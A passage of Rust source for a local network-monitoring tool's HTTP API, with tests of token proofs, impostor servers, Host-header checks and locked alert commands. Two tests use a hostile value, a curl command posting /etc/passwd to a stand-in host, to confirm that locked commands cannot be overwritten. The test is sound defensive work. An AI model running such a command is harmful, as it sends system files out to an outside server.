        // The file is the path without its leading slash, under PINGTABLE_UI_DIR too.
        "/fonts/JetBrainsMono-Regular.woff2" => (&path[1..], "font/woff2", MONO_400),
        "/fonts/JetBrainsMono-Medium.woff2" => (&path[1..], "font/woff2", MONO_500),
        "/fonts/JetBrainsMono-SemiBold.woff2" => (&path[1..], "font/woff2", MONO_600),
        _ => return reply_error(request, 404, "Not found."),
    };
    let body = ctx
        .ui_dir
        .as_ref()
        .and_then(|dir| std::fs::read(dir.join(file)).ok())
        .unwrap_or_else(|| built_in.to_vec());
    let csp = "default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; \
               object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'none'";
    reply(request, 200, content_type, body, &[("Content-Security-Policy", csp)]);
}

/// Body of `PUT /api/v1/config`. Each part is optional: what is left out
/// stays as it is, so a window that shows only the settings cannot undo
/// hosts added to the list meanwhile, and the other way round.
#[derive(Deserialize)]
struct ConfigBody {
    /// Settings to change. Fields left out keep their values.
    settings: Option<serde_json::Map<String, Value>>,
    /// The whole host list, as typed.
    hosts_text: Option<String>,
    /// The `hosts_rev` that `GET /config` gave with the list this change was
    /// made to. When the list has changed since, nothing is applied.
    hosts_rev: Option<u64>,
    /// Keep the history of hosts that stay in the list. Defaults to true when
    /// `hosts_text` is left out or is the list in use, false when another
    /// list is sent.
    keep_stats: Option<bool>,
    autostart: Option<bool>,
}

#[derive(Deserialize)]
struct ControlBody {
    action: String,
}

/// Body of `POST /api/v1/hosts/{id}`: turn the host on or off, or act on it.
#[derive(Deserialize)]
struct HostBody {
    enabled: Option<bool>,
    /// `ping_now` or `reset`.
    action: Option<String>,
}

/// Body of `POST /api/v1/hosts`: one action on several hosts.
#[derive(Deserialize)]
struct BulkBody {
    #[serde(default)]
    ids: Vec<u32>,
    /// `mute`, `unmute`, `solo`, `unmute_all`, `ping_now` or `reset`.
    action: String,
}

/// Body of `POST /api/v1/hosts/add`.
#[derive(Deserialize)]
struct AddBody {
    /// One host per entry, optionally followed by a description and options.
    entries: Vec<String>,
    /// Existing or new group name; none adds the hosts ungrouped.
    group: Option<String>,
    /// TCP ports to watch on every entry that names no port of its own: one
    /// row for each. Empty adds the entries as typed.
    #[serde(default)]
    ports: Vec<u16>,
    /// More ports as a person types them: `8080 9000-9005`.
    #[serde(default)]
    ports_text: String,
    /// With ports: keep the plain ping row as well.
    #[serde(default)]
    ping: bool,
}

#[derive(Deserialize)]
struct ImportBody {
    text: String,
}

/// Body of `POST /api/v1/measure`.
#[derive(Deserialize)]
struct MeasureBody {
    ids: Vec<u32>,
    duration_secs: u32,
    per_second: u32,
}

#[derive(Deserialize)]
struct ParseBody {
    text: String,
    #[serde(flatten)]
    options: ParseOptions,
}

fn api(ctx: &Ctx, mut request: Request, path: &str, query: &str) {
    let method = request.method().clone();
    let engine = &ctx.engine;

    match (&method, path) {
        (Method::Get, "/api/v1/state") => {
            let since: u64 = query_param(query, "since").and_then(|v| v.parse().ok()).unwrap_or(0);
            let wait_ms: u64 = query_param(query, "wait_ms").and_then(|v| v.parse().ok()).unwrap_or(0).min(MAX_WAIT_MS);
            // Optional: only rows in these states, and at most this many of them. A
            // table of 65,536 hosts is too big to read in one reply, and a caller
            // that wants the hosts that are down needs none of the others.
            let wanted: Option<Vec<String>> = query_param(query, "state").map(|v| v.replace("%2C", ",").replace("%2c", ",").split(',').map(str::to_owned).collect());
            if let Some(unknown) = wanted.iter().flatten().find(|s| !STATES.contains(&s.as_str())) {
                return reply_error(request, 400, &format!("There is no state \"{unknown}\". States are up, down, failing, recovering, pending and muted; give one or more, split by commas."));
            }
            let limit: Option<usize> = match query_param(query, "limit").map(str::parse) {
                None => None,
                Some(Ok(limit)) => Some(limit),
                Some(Err(_)) => return reply_error(request, 400, "limit must be a whole number: the most rows to send."),
            };
            // A filtered reply to since= would never report a row that left the
            // states asked for, and the rows a limit cut off would be lost for good.
            if since > 0 && (wanted.is_some() || limit.is_some()) {
                return reply_error(
                    request,
                    400,
                    "state and limit read part of the whole table, so they cannot be used with since. Read the table with them \
                     and without since, or follow changes with since and without them.",
                );
            }
            // The notice from reading the config goes, once, to the first
            // window that follows changes, as a note it shows like any other.
            let notice = if since > 0 { ctx.notice.lock().unwrap_or_else(|p| p.into_inner()).take() } else { None };
            if notice.is_none() && wait_ms > 0 && since > 0 && since <= engine.seq() {
                let seq = engine.wait_change(since, Duration::from_millis(wait_ms));
                if seq > since {
                    // 200 hosts at one ping a second would otherwise mean a reply per ping.
                    let hosts = engine.host_count() as u64;
                    std::thread::sleep(Duration::from_millis((COALESCE_MIN_MS + hosts * 2).min(COALESCE_MAX_MS)));
                }
            }
            let mut snapshot = engine.snapshot(since);
            // How many rows are in the states asked for, before the limit.
            let matched = (wanted.is_some() || limit.is_some()).then(|| {
                if let Some(wanted) = &wanted {
                    snapshot.hosts.retain(|row| wanted.iter().any(|s| s == row.state));
                }
                let matched = snapshot.hosts.len();
                snapshot.hosts.truncate(limit.unwrap_or(usize::MAX));
                matched
            });
            if notice.is_none() && matched.is_none() {
                return reply_json(request, 200, &snapshot);
            }
            let mut doc = serde_json::to_value(&snapshot).unwrap_or_else(|_| json!({}));
            if let Some(text) = notice {
                let note = json!({ "seq": snapshot.seq, "t_ms": snapshot.now_ms, "text": text, "sticky": true });
                match doc.get_mut("notes").and_then(Value::as_array_mut) {
                    Some(notes) => notes.push(note),
                    None => doc["notes"] = json!([note]),
                }
            }
            if let Some(matched) = matched {
                doc["matched"] = json!(matched);
            }
            reply_json(request, 200, &doc);
        }

        (Method::Get, "/api/v1/config") => {
            // The list and its revision as one, not a change apart.
            let editing = ctx.edit.lock().unwrap_or_else(|p| p.into_inner());
            let (settings, hosts_text) = engine.config();
            let rev = hosts_rev(ctx);
            drop(editing);
            let autostart = ctx.cfg.lock().map(|c| c.autostart).unwrap_or(true);
            let locked = commands_locked(ctx);
            reply_json(
                request,
                200,
                &json!({
                    "schema_version": 1,
                    "settings": settings,
                    "hosts_text": hosts_text,
                    "hosts_rev": rev,
                    "groups": hostlist::group_names(&hosts_text),
                    "autostart": autostart,
                    "commands_locked": locked,
                    "config_path": ctx.path.display().to_string(),
                }),
            );
        }

        (Method::Put, "/api/v1/config") => {
            let mut fields: serde_json::Map<String, Value> = match read_json(&mut request) {
                Ok(fields) => fields,
                Err(why) => return reply_error(request, 400, &why),
            };
            fields.retain(|name, _| !CONFIG_READ_ONLY.contains(&name.as_str()));
            let all = "It takes \"settings\", \"hosts_text\", \"hosts_rev\", \"keep_stats\" and \"autostart\", and leaves the \
                       other fields GET /config gives as they are.";
            if let Err(why) = unknown_field(&fields, &CONFIG_FIELDS, "PUT /config has no field", all) {
                return reply_error(request, 400, &why);
            }
            let body: ConfigBody = match serde_json::from_value(Value::Object(fields)) {
                Ok(body) => body,
                Err(why) => return reply_error(request, 400, &format!("request body is not valid: {why}")),
            };
            let editing = ctx.edit.lock().unwrap_or_else(|p| p.into_inner());
            let rev = hosts_rev(ctx);
            if body.hosts_rev.is_some_and(|sent| sent != rev) {
                drop(editing);
                return reply_json(
                    request,
                    409,
                    &json!({ "error": "The host list changed while this window was open. Load it again, then make your change.", "hosts_rev": rev }),
                );
            }
            let (current, current_text) = engine.config();
            let settings = match merged_settings(&current, body.settings) {
                Ok(settings) => settings,
                Err(why) => return reply_error(request, 400, &why),
            };
            // The same list sent back (a script that read it and changed a setting) keeps the counters.
            let keep_stats = body.keep_stats.unwrap_or(body.hosts_text.as_ref().is_none_or(|sent| *sent == current_text));
            let hosts_text = body.hosts_text.unwrap_or(current_text);
            let (warnings, saved) = apply_and_save(ctx, settings, &hosts_text, keep_stats, body.autostart);
            let rev = hosts_rev(ctx);
            drop(editing);
            let hosts = engine.snapshot(0).counts.total;
            reply_json(
                request,
                200,
                &json!({
                    "ok": true,
                    "hosts": hosts,
                    "hosts_rev": rev,
                    "warnings": warnings,
                    "commands_locked": commands_locked(ctx),
                    "save_error": saved,
                }),
            );
        }

        (Method::Post, "/api/v1/hosts/add") => {
            let body: AddBody = match read_json(&mut request) {
                Ok(body) => body,
                Err(why) => return reply_error(request, 400, &why),
            };
            match add_hosts(ctx, &body) {
                Ok(reply) => reply_json(request, 200, &reply),
                Err(why) => reply_error(request, 400, &why),
            }
        }

        (Method::Post, "/api/v1/import") => {
            let body: ImportBody = match read_json(&mut request) {
                Ok(body) => body,
                Err(why) => return reply_error(request, 400, &why),
            };
            let import = hostlist::import_text(&body.text);
            reply_json(
                request,
                200,
                &json!({
                    "format": import.format,
                    "text": import.lines.join("\n"),
                    "hosts": import.hosts,
                    "skipped": import.skipped,
                }),
            );
        }

        (Method::Post, "/api/v1/control") => {
            let body: ControlBody = match read_json(&mut request) {
                Ok(body) => body,
                Err(why) => return reply_error(request, 400, &why),
            };
            match body.action.as_str() {
                "start" => {
                    engine.start()
                }
                "stop" => engine.stop(),
                "ping_now" => engine.ping_now(),
                "reset" => engine.reset(),
                other => return reply_error(request, 400, &format!("Unknown action \"{other}\".")),
            }
            reply_json(request, 200, &json!({ "ok": true }));
        }

        (Method::Post, "/api/v1/parse") => {
            let body: ParseBody = match read_json(&mut request) {
                Ok(body) => body,
                Err(why) => return reply_error(request, 400, &why),
            };
            let report = parse_host_list(&body.text, &body.options);
            let groups: std::collections::BTreeSet<&str> = report.hosts.iter().filter_map(|h| h.group.as_deref()).collect();
            reply_json(
                request,
                200,
                &json!({
                    "count": report.hosts.len(),
                    "groups": groups.len(),
                    "tcp": report.hosts.iter().filter(|h| h.probe != pingtable_core::Probe::Icmp).count(),
                    "warnings": report.warnings,
                }),
            );
        }

        (Method::Get, "/api/v1/export") => {
            let snapshot = engine.snapshot(0);
            let stamp = export::rfc3339(snapshot.now_ms).replace([':', '-'], "");
            let stamp = &stamp[..15.min(stamp.len())];
            match query_param(query, "format").unwrap_or("json") {
                "csv" => reply(
                    request,
                    200,
                    "text/csv; charset=utf-8",
                    export::to_csv(&snapshot.hosts).into_bytes(),
                    &[("Content-Disposition", &format!("attachment; filename=\"pingtable-{stamp}.csv\""))],
                ),
                "json" => reply(
                    request,
                    200,
                    "application/json; charset=utf-8",
                    export::to_json(&snapshot).into_bytes(),
                    &[("Content-Disposition", &format!("attachment; filename=\"pingtable-{stamp}.json\""))],
                ),
                other => reply_error(request, 400, &format!("Unknown format \"{other}\". Use json or csv.")),
            }
        }

        (Method::Post, "/api/v1/hosts") => {
            let body: BulkBody = match read_json(&mut request) {
                Ok(body) => body,
                Err(why) => return reply_error(request, 400, &why),
            };
            let mut mutes_changed = true;
            // A change of the list puts the saved mutes back on its hosts. Muting
            // under the same lock keeps that from undoing a mute or an unmute
            // made in between, and from saving it undone.
            let _editing = ctx.edit.lock().unwrap_or_else(|p| p.into_inner());
            match body.action.as_str() {
                "mute" => {
                    engine.set_enabled_many(&body.ids, false);
                }
                "unmute" => {
                    engine.set_enabled_many(&body.ids, true);
                }
                "solo" => {
                    engine.solo(&body.ids);
                }
                "unmute_all" => engine.unmute_all(),
                "remove" => {
                    // Delete the list lines of hosts that have a line to themselves.
                    let lines = engine.removable_lines(&body.ids);
                    let shared = body.ids.len().saturating_sub(lines.len());
                    if !lines.is_empty() {
                        let (settings, text) = engine.config();
                        let (_, saved) = apply_and_save(ctx, settings, &hostlist::remove_lines(&text, &lines), true, None);
                        if let Some(why) = saved {
                            return reply_error(request, 500, &format!("Removed, but the settings file could not be written: {why}"));
                        }
                    }
                    return reply_json(request, 200, &json!({ "ok": true, "removed": lines.len(), "shared": shared }));
                }
                "ping_now" => {
                    mutes_changed = false;
                    for id in &body.ids {
                        engine.ping_host(*id);
                    }
                }
                "reset" => {
                    mutes_changed = false;
                    for id in &body.ids {
                        engine.reset_host(*id);
                    }
                }
                other => return reply_error(request, 400, &format!("Unknown action \"{other}\".")),
            }
            if mutes_changed {
                let mut cfg = ctx.cfg.lock().unwrap_or_else(|p| p.into_inner());
                cfg.muted = engine.muted_keys();
                let _ = save(ctx, &mut cfg);
            }
            reply_json(request, 200, &json!({ "ok": true }));
        }

        (Method::Post, "/api/v1/measure") => {
            let body: MeasureBody = match read_json(&mut request) {
                Ok(body) => body,
                Err(why) => return reply_error(request, 400, &why),
            };
            match engine.measure_start(&body.ids, body.duration_secs, body.per_second) {
                Some(id) => reply_json(request, 200, &json!({ "ok": true, "id": id })),
                None => reply_error(request, 409, "None of those hosts can be measured. Unmute them first."),
            }
        }

        (Method::Post, "/api/v1/measure/stop") => {
            engine.measure_stop();
            reply_json(request, 200, &json!({ "ok": true }));
        }

        (Method::Get, "/api/v1/measure") => reply_json(request, 200, &json!({ "measurement": engine.measure_report() })),

        (Method::Get, "/api/v1/source") => {
            let default_v4 = netinfo::source_for("1.1.1.1".parse().expect("address"));
            let default_v6 = netinfo::source_for("2606:4700:4700::1111".parse().expect("address"));
            reply_json(
                request,
                200,
                &json!({
                    "name": netinfo::local_name(),
                    "interfaces": netinfo::interfaces(),
                    "default_v4": default_v4,
                    "default_v6": default_v6,
                }),
            );
        }

        (Method::Get, "/api/v1/defaults") => reply_json(
            request,
            200,
            &json!({
                "schema_version": 1,
                "settings": config::default_settings(),
                "hosts_text": config::default_hosts_text(ctx.port),
            }),
        ),

        (Method::Get, "/api/v1/info") => reply_json(
            request,
            200,
            &json!({
                "version": env!("CARGO_PKG_VERSION"),
                "machine": netinfo::local_name(),
                "os": std::env::consts::OS,
                "arch": std::env::consts::ARCH,
                "rustc": env!("PINGTABLE_RUSTC"),
                "target": env!("PINGTABLE_TARGET"),
                "icmp": if cfg!(windows) { "the Windows ICMP API" } else { "the system ping command" },
                "config_path": ctx.path.display().to_string(),
                "log_path": crate::log_path().display().to_string(),
                "credits": crate::CREDITS,
                "website": crate::WEBSITE,
                "source": crate::SOURCE,
                "license": "Apache License 2.0",
                "libraries": ["tiny_http", "serde", "socket2", "dns-lookup", "hmac", "sha2", "windows-sys", "tao", "wry"],
            }),
        ),

        (_, p) if p.starts_with("/api/v1/hosts/") => {
            let rest = &p["/api/v1/hosts/".len()..];
            if let Some(id) = rest.strip_suffix("/trace").and_then(|id| id.parse::<u32>().ok()) {
                if method != Method::Post {
                    return reply_error(request, 405, "Method not allowed.");
                }
                return trace_host(ctx, request, id);
            }
            let Ok(id) = rest.parse::<u32>() else {
                return reply_error(request, 404, "No such host.");
            };
            match method {
                Method::Get => match engine.detail(id) {
                    Some(detail) => reply_json(request, 200, &detail),
                    None => reply_error(request, 404, "No such host."),
                },
                Method::Post => {
                    let body: HostBody = match read_json(&mut request) {
                        Ok(body) => body,
                        Err(why) => return reply_error(request, 400, &why),
                    };
                    if engine.detail(id).is_none() {
                        return reply_error(request, 404, "No such host.");
                    }
                    if let Some(enabled) = body.enabled {
                        // Under the edit lock, as in POST /hosts.
                        let _editing = ctx.edit.lock().unwrap_or_else(|p| p.into_inner());
                        engine.set_enabled(id, enabled);
                        // Remember who is muted for the next start.
                        let mut cfg = ctx.cfg.lock().unwrap_or_else(|p| p.into_inner());
                        cfg.muted = engine.muted_keys();
                        let _ = save(ctx, &mut cfg);
                    }
                    match body.action.as_deref() {
                        None => {}
                        Some("ping_now") => {
                            if !engine.ping_host(id) {
                                return reply_error(request, 409, "This host is muted.");
                            }
                        }
                        Some("reset") => {
                            engine.reset_host(id);
                        }
                        Some(other) => return reply_error(request, 400, &format!("Unknown action \"{other}\".")),
                    }
                    reply_json(request, 200, &json!({ "ok": true }));
                }
                _ => reply_error(request, 405, "Method not allowed."),
            }
        }

        _ => reply_error(request, 404, "Not found."),
    }
}

/// A server for tests: its own config file in a folder of its own, any free
/// port, no hosts unless `cfg` has some. Returns the config path and the port.
#[cfg(test)]
pub(crate) fn test_server(name: &str, cfg: Config) -> (PathBuf, u16) {
    let dir = std::env::temp_dir().join(format!("pingtable-test-{}-{name}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    let path = dir.join("pingtable.json");
    let engine = Engine::new(cfg.settings.clone(), &cfg.hosts_text);
    let running = start(engine, Config { port: 0, ..cfg.clone() }, path.clone()).expect("a free port");
    // The file names the port really used, so nothing looks anywhere else.
    config::save(&path, &Config { port: running.port, ..cfg }).unwrap();
    (path, running.port)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::TcpListener;

    const TOKEN: &str = "0123456789abcdef0123456789abcdef";

    fn test_config() -> Config {
        Config { token: TOKEN.into(), hosts_text: String::new(), ..Config::default() }
    }

    #[test]
    fn the_free_table_has_no_license_or_port_checker_routes() {
        let (path, port) = test_server("free-edition", test_config());
        assert_eq!(api_json(port, "GET", "/api/v1/license", None).0, 404);
        assert_eq!(api_json(port, "POST", "/api/v1/portcheck", Some(json!({}))).0, 404);
        assert!(api_json(port, "GET", "/api/v1/info", None).1.get("licensing").is_none());
        assert_eq!(api_json(port, "POST", "/api/v1/control", Some(json!({ "action": "start" }))).0, 200);
        assert!(!path.with_extension("license").exists());
        remove_folder(&path);
    }

    /// One request as written, and the whole reply.
    fn raw(port: u16, request: &str) -> String {
        let mut stream = TcpStream::connect(("127.0.0.1", port)).unwrap();
        stream.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
        stream.write_all(request.as_bytes()).unwrap();
        let mut reply = String::new();
        let _ = stream.read_to_string(&mut reply);
        reply
    }

    fn api_json(port: u16, method: &str, path: &str, body: Option<Value>) -> (u16, Value) {
        let (status, text) = call_local(port, TOKEN, method, path, body.map(|b| b.to_string()).as_deref(), Duration::from_secs(5)).expect("the test server answers");
        (status, serde_json::from_str(&text).unwrap_or(Value::Null))
    }

    fn remove_folder(path: &Path) {
        let _ = std::fs::remove_dir_all(path.parent().unwrap());
    }

    #[test]
    fn the_hello_proof_is_hmac_sha256_of_label_port_and_nonce() {
        // Worked out separately: HMAC-SHA256(key, "hello-v1\n7464\nabcdefghijklmnop").
        assert_eq!(hello_proof(TOKEN, 7464, "abcdefghijklmnop"), "fa029a93342208b072cf9f5ee0c4633e9b59c713dc41e156be629c2eb34ed3d6");
        assert!(nonce_ok("abcdefghijklmnop") && nonce_ok(&"A-_9".repeat(32)));
        assert!(!nonce_ok("short") && !nonce_ok(&"a".repeat(129)) && !nonce_ok("abcdefghijklmno%"));
    }

    #[test]
    fn hello_proves_the_token_without_needing_it() {
        let (path, port) = test_server("hello", test_config());
        let reply = raw(port, &format!("GET /api/v1/hello?nonce=abcdefghijklmnop HTTP/1.0\r\nHost: 127.0.0.1:{port}\r\n\r\n"));
        assert!(reply.starts_with("HTTP/1.0 200") || reply.starts_with("HTTP/1.1 200"), "{reply}");
        assert!(reply.contains(&hello_proof(TOKEN, port, "abcdefghijklmnop")), "{reply}");
        assert!(!reply.contains(TOKEN));
        assert!(reply.to_ascii_lowercase().contains("cross-origin-resource-policy: same-origin"), "{reply}");
        let bad = raw(port, &format!("GET /api/v1/hello?nonce=x HTTP/1.0\r\nHost: 127.0.0.1:{port}\r\n\r\n"));
        assert!(bad.contains(" 400 "), "{bad}");
        // Every other call still needs the token, and a wrong Host is still refused.
        assert!(raw(port, &format!("GET /api/v1/info HTTP/1.0\r\nHost: 127.0.0.1:{port}\r\n\r\n")).contains(" 401 "));
        assert!(raw(port, "GET /api/v1/hello?nonce=abcdefghijklmnop HTTP/1.0\r\nHost: evil.example\r\n\r\n").contains(" 403 "));

        assert!(is_pingtable(port, TOKEN));
        assert!(!is_pingtable(port, "fedcba9876543210fedcba9876543210"));
        let (status, info) = api_json(port, "GET", "/api/v1/info", None);
        assert_eq!((status, info["version"].as_str()), (200, Some(env!("CARGO_PKG_VERSION"))));
        // The run file names the port really used.
        assert_eq!(config::ports_to_try(&path, &test_config())[0], port);
        assert_eq!(find_local(&path, &test_config()), Ok(port));
        remove_folder(&path);
    }

    #[test]
    fn every_font_the_stylesheet_names_is_served_as_woff2() {
        let (path, port) = test_server("fonts", test_config());
        let css = std::str::from_utf8(APP_CSS).unwrap();
        let named: Vec<&str> = css
            .match_indices("url(\"fonts/")
            .map(|(at, _)| {
                let rest = &css[at + 5..];
                &rest[..rest.find('"').unwrap()]
            })
            .collect();
        assert_eq!(named.len(), 3, "{named:?}");
        for file in named {
            let mut stream = TcpStream::connect(("127.0.0.1", port)).unwrap();
            stream.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
            stream.write_all(format!("GET /{file} HTTP/1.0\r\nHost: 127.0.0.1:{port}\r\n\r\n").as_bytes()).unwrap();
            let mut reply = Vec::new();
            let _ = stream.read_to_end(&mut reply);
            let end = reply.windows(4).position(|w| w == b"\r\n\r\n").expect("a head and a body");
            let head = String::from_utf8_lossy(&reply[..end]).to_ascii_lowercase();
            assert!(head.starts_with("http/1.1 200") || head.starts_with("http/1.0 200"), "{file}: {head}");
            assert!(head.contains("content-type: font/woff2"), "{file}: {head}");
            assert!(reply[end + 4..].starts_with(b"wOF2"), "{file} is not a woff2 file");
        }
        remove_folder(&path);
    }

    /// A listener that is not pingtable: it answers each connection with
    /// `reply(request)` and records everything it is sent.
    fn impostor(connections: usize, reply: impl Fn(&str) -> String + Send + 'static) -> (u16, std::thread::JoinHandle<String>) {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let heard = std::thread::spawn(move || {
            let mut heard = String::new();
            for _ in 0..connections {
                let (mut stream, _) = listener.accept().unwrap();
                stream.set_read_timeout(Some(Duration::from_millis(500))).unwrap();
                let mut buf = [0u8; 4096];
                let n = stream.read(&mut buf).unwrap_or(0);
                let request = String::from_utf8_lossy(&buf[..n]).into_owned();
                let _ = stream.write_all(reply(&request).as_bytes());
                heard.push_str(&request);
                // Whatever else comes on this connection.
                let n = stream.read(&mut buf).unwrap_or(0);
                heard.push_str(&String::from_utf8_lossy(&buf[..n]));
            }
            heard
        });
        (port, heard)
    }

    fn http_ok(body: &str) -> String {
        format!("HTTP/1.0 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{body}", body.len())
    }

    #[test]
    fn an_impostor_never_receives_the_token() {
        let (port, heard) = impostor(3, |_| http_ok(r#"{"proof":"00","version":"0.3.0"}"#));
        assert!(!is_pingtable(port, TOKEN));
        assert_eq!(call_local(port, TOKEN, "GET", "/api/v1/state", None, Duration::from_secs(2)), Err(LocalError::Unproven));
        // An old-style check that the reply looks like pingtable is not enough either.
        assert!(!is_pingtable(port, TOKEN));
        let heard = heard.join().unwrap();
        assert!(heard.contains("GET /api/v1/hello?nonce="), "{heard}");
        assert!(!heard.contains(TOKEN), "{heard}");
    }

    #[test]
    fn a_proof_passed_on_from_the_real_pingtable_is_refused() {
        let (path, real) = test_server("relay", test_config());
        // Listens on another port and hands every question to the real pingtable.
        let (port, heard) = impostor(1, move |request| {
            let line = request.lines().next().unwrap_or("");
            raw(real, &format!("{line}\r\nHost: 127.0.0.1:{real}\r\n\r\n"))
        });
        assert_eq!(call_local(port, TOKEN, "GET", "/api/v1/state", None, Duration::from_secs(2)), Err(LocalError::Unproven));
        let heard = heard.join().unwrap();
        assert!(!heard.contains(TOKEN), "{heard}");
        // A stale run file that points at the impostor is passed over for the real port.
        let cfg = Config { port: real, ..test_config() };
        config::write_run_file(&path, port).unwrap();
        assert_eq!(config::ports_to_try(&path, &cfg), [port, real]);
        remove_folder(&path);
    }

    #[test]
    fn nothing_listening_is_not_running() {
        let port = TcpListener::bind("127.0.0.1:0").unwrap().local_addr().unwrap().port();
        assert_eq!(call_local(port, TOKEN, "GET", "/api/v1/state", None, Duration::from_secs(1)), Err(LocalError::NotRunning));
    }

    #[test]
    fn a_config_put_with_one_half_keeps_the_other() {
        let cfg = Config { hosts_text: "127.0.0.1 Loopback".into(), settings: config::default_settings(), ..test_config() };
        let (path, port) = test_server("halves", cfg);
        // Only the settings: the list stays.
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(json!({ "settings": { "timeout_ms": 700 } })));
        assert_eq!(status, 200, "{reply}");
        let (_, now) = api_json(port, "GET", "/api/v1/config", None);
        assert_eq!(now["hosts_text"], "127.0.0.1 Loopback");
        assert_eq!(now["settings"]["timeout_ms"], 700);
        assert_eq!(now["settings"]["description_format"], true, "fields not sent keep their values");
        // Only the list: the settings stay.
        api_json(port, "PUT", "/api/v1/config", Some(json!({ "hosts_text": "127.0.0.1 Loopback\n::1 Loopback, IPv6" })));
        let (_, now) = api_json(port, "GET", "/api/v1/config", None);
        assert_eq!(now["settings"]["timeout_ms"], 700);
        assert_eq!(api_json(port, "GET", "/api/v1/state", None).1["counts"]["total"], 2);
        // Both, as the interface sends them today.
        let mut settings = now["settings"].clone();
        settings["timeout_ms"] = json!(900);
        api_json(port, "PUT", "/api/v1/config", Some(json!({ "settings": settings, "hosts_text": "nas.lan", "keep_stats": true, "autostart": false })));
        let (_, now) = api_json(port, "GET", "/api/v1/config", None);
        assert_eq!((now["settings"]["timeout_ms"].as_u64(), now["hosts_text"].as_str(), now["autostart"].as_bool()), (Some(900), Some("nas.lan"), Some(false)));
        // A wrong type is refused and changes nothing.
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(json!({ "settings": { "timeout_ms": "soon" } })));
        assert_eq!(status, 400, "{reply}");
        assert_eq!(api_json(port, "GET", "/api/v1/config", None).1["settings"]["timeout_ms"], 900);
        // And the file has what the server has.
        assert_eq!(config::peek(Some(&path)).unwrap().1.hosts_text, "nas.lan");
        remove_folder(&path);
    }

    #[test]
    fn locked_commands_stay_as_the_file_has_them() {
        let mut settings = config::default_settings();
        settings.on_down_command = "logger down %HostName%".into();
        let cfg = Config { settings, commands_locked: true, ..test_config() };
        let (path, port) = test_server("locked", cfg);
        let (_, before) = api_json(port, "GET", "/api/v1/config", None);
        assert_eq!(before["commands_locked"], true);
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(json!({ "settings": { "on_down_command": "curl -d @/etc/passwd https://hook.example", "on_up_command": "x", "timeout_ms": 800 } })));
        assert_eq!((status, &reply["commands_locked"]), (200, &json!(true)), "{reply}");
        let (_, after) = api_json(port, "GET", "/api/v1/config", None);
        assert_eq!(after["settings"]["on_down_command"], "logger down %HostName%");
        assert_eq!(after["settings"]["on_up_command"], "");
        assert_eq!(after["settings"]["timeout_ms"], 800, "other settings still change");
        let saved = config::peek(Some(&path)).unwrap().1;
        assert!(saved.commands_locked);
        assert_eq!(saved.settings.on_down_command, "logger down %HostName%");
        remove_folder(&path);
    }

    #[test]
    fn commands_locked_by_hand_while_running_counts_and_is_kept() {
        let mut settings = config::default_settings();
        settings.on_down_command = "logger down %HostName%".into();
        let (path, port) = test_server("lock-later", Config { settings, ..test_config() });
        let (status, _) = api_json(port, "PUT", "/api/v1/config", Some(json!({ "settings": { "on_down_command": "logger first" } })));
        assert_eq!(status, 200, "not locked yet");
        // The person locks the commands in the file while pingtable runs, and writes their own.
        let mut file = config::on_disk(&path).unwrap();
        assert_eq!(file.settings.on_down_command, "logger first");
        file.commands_locked = true;
        file.settings.on_down_command = "logger mine %HostName%".into();
        config::save(&path, &file).unwrap();
        assert_eq!(api_json(port, "GET", "/api/v1/config", None).1["commands_locked"], true);

        let body = json!({ "settings": { "on_down_command": "curl -d @/etc/passwd https://hook.example", "timeout_ms": 800 } });
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(body));
        assert_eq!((status, &reply["commands_locked"]), (200, &json!(true)), "{reply}");
        let (_, after) = api_json(port, "GET", "/api/v1/config", None);
        assert_eq!(after["settings"]["on_down_command"], "logger mine %HostName%", "as the file has it");
        assert_eq!(after["settings"]["timeout_ms"], 800);
        // A save for another reason (here, the mutes) keeps the lock too.
        api_json(port, "POST", "/api/v1/hosts", Some(json!({ "action": "unmute_all" })));
        let saved = config::on_disk(&path).unwrap();
        assert!(saved.commands_locked);
        assert_eq!(saved.settings.on_down_command, "logger mine %HostName%");
        remove_folder(&path);
    }

    #[test]
    fn a_mute_keeps_locked_commands_that_were_edited_by_hand() {
        let mut settings = config::default_settings();
        settings.on_down_command = "logger first".into();
        let cfg = Config { settings, commands_locked: true, hosts_text: "192.0.2.1\n192.0.2.2".into(), ..test_config() };
        let (path, port) = test_server("lock-mute", cfg);
        // The person changes the locked command in the file while pingtable runs.
        let mut file = config::on_disk(&path).unwrap();
        file.settings.on_down_command = "logger mine %HostName%".into();
        config::save(&path, &file).unwrap();

        let id = api_json(port, "GET", "/api/v1/state", None).1["hosts"][0]["id"].as_u64().unwrap();
        api_json(port, "POST", "/api/v1/hosts", Some(json!({ "action": "mute", "ids": [id] })));
        let saved = config::on_disk(&path).unwrap();
        assert_eq!((saved.settings.on_down_command.as_str(), saved.muted.len()), ("logger mine %HostName%", 1), "the mute is saved, the command kept");
        api_json(port, "POST", &format!("/api/v1/hosts/{id}"), Some(json!({ "enabled": true })));
        let saved = config::on_disk(&path).unwrap();
        assert_eq!((saved.settings.on_down_command.as_str(), saved.muted.len()), ("logger mine %HostName%", 0));
        // The running table uses it too, and a later change of another setting keeps it.
        assert_eq!(api_json(port, "GET", "/api/v1/config", None).1["settings"]["on_down_command"], "logger mine %HostName%");
        api_json(port, "PUT", "/api/v1/config", Some(json!({ "settings": { "timeout_ms": 800 } })));
        assert_eq!(config::on_disk(&path).unwrap().settings.on_down_command, "logger mine %HostName%");
        remove_folder(&path);
    }

    #[test]
    fn each_run_numbers_its_host_list_afresh() {
        let (a_path, a) = test_server("rev-a", test_config());
        let (b_path, b) = test_server("rev-b", test_config());
        let rev = |port| api_json(port, "GET", "/api/v1/config", None).1["hosts_rev"].as_u64().expect("hosts_rev");
        let (first, second) = (rev(a), rev(b));
        // A window left open across a restart sends a number the new run does not use.
        assert_ne!(first, second);
        assert!(first < 1 << 53 && second < 1 << 53, "whole numbers in JavaScript: {first} {second}");
